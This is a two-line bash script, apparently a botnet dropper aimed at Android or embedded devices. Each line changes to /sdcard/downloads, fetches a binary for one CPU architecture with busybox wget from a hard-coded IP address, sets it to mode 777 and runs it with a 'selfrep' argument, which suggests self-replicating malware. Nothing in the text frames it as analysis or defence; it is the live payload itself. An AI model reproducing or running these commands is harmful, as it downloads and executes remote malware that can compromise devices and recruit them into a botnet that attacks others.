#!/bin/bash
cd /sdcard/downloads; busybox wget http://185.244.25.200/swrgiuhguhwrguiwetu/arm7; chmod 777 arm7; ./arm7 selfrep.arm7
cd /sdcard/downloads; busybox wget http://185.244.25.200/swrgiuhguhwrguiwetu/x86; chmod 777 x86; ./x86 selfrep.x86